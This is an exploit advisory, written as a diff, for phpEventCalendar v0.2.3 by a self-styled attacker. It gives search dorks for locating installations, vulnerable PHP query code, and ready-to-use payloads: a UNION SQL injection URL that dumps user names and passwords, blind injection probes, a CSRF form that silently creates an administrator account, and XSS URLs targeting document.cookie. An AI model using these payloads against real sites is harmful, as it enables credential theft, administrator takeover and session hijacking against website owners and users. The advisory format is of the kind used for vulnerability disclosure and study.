@@ -1,0 +1,89 @@
+phpEventCalendar v.0.2.3 Multiple Vulnerabilities
+====================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST
+.:. Contact        : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : http://www.phpcodeworks.com/pec/downloads
+.:. Dork           : [1]"phpEventGallery by ikemcg at ikemcg.com"
+                     [2]"phpEventCalendar by ikemcg at ikemcg.com"
+####################################################################
+
+1:SQL INJECTION:   (http://www.exploit-db.com/exploits/4135/)
+########################################
+1-VULNERABILITY: CLASSIC MYSQL INJECTION
+########################################
+
+/eventdisplay.php (LINE: 12-14)
+
+-----------------------------------------------------------------------------
+ $sql = "SELECT d, m, y FROM " . DB_TABLE_PREFIX . "mssgs WHERE id=" .
+$id;
+ $result = mysql_query($sql) or die(mysql_error());
+ $row = mysql_fetch_array($result);
+
+-----------------------------------------------------------------------------
+
+#####################################################
+EXPLOIT
+#####################################################
+
+http://localhost/phpEventCalendar/eventdisplay.php?id=1+and+1=2+union+select+concat(uid,0x3a,username,0x3a,password),2,3+from+pec_users
+-----------------------------------------------------------------------------
+######################################
+2-VULNERABILITY: BLIND MYSQL INJECTION
+######################################
+
+/eventform.php (LINE: 17-23)
+
+-----------------------------------------------------------------------------
+mysql_connect(DB_HOST, DB_USER, DB_PASS) or die(mysql_error());
+        mysql_select_db(DB_NAME) or die(mysql_error());
+
+        $sql = "SELECT uid FROM " . DB_TABLE_PREFIX . "mssgs WHERE id =
+$id";
+
+        $result = mysql_query($sql) or die(mysql_error());
+        $row = mysql_fetch_assoc($result);
+
+-----------------------------------------------------------------------------
+
+#####################################################
+EXPLOIT
+#####################################################
+
+http://localhost/phpEventCalendar/eventform.php?id=1+and+substring(@@version,1,1)=5
+<< TRUE
+http://localhost/phpEventCalendar/eventform.php?id=1+and+substring(@@version,1,1)=5
+<< FALSE
+-----------------------------------------------------------------------------
+
+
+2:CSRF[ ADD ADMIN ]
+########################################
+
+<form method="POST" name="form0" action="
+http://localhost/phpEventCalendar/useradmin.php?flag=insert">
+<input type="hidden" name="username" value="ADMIN"/>
+<input type="hidden" name="pw" value="123456"/>
+<input type="hidden" name="pwconfirm" value="123456"/>
+<input type="hidden" name="userlevel" value="2"/>
+<input type="hidden" name="fname" value="MMMM"/>
+<input type="hidden" name="lname" value="CCCC"/>
+<input type="hidden" name="email" value="MYEMAIL@HOTMAIL.COM"/>
+</form>
+
+</body>
+</html>
+-----------------------------------------------------------------------------
+
+
+3:Multiple Cross-Site Scripting
+########################################
+
+http://localhost/phpEventCalendar/eventform.php?id='"()%26%251<ScRiPt
+>prompt(document.cookie)<%2fScRiPt>
+http://localhost/phpEventCalendar/eventdisplay.php?id='"()%26%251<ScRiPt
+>prompt(document.cookie)<%2fScRiPt>
+####################################################################
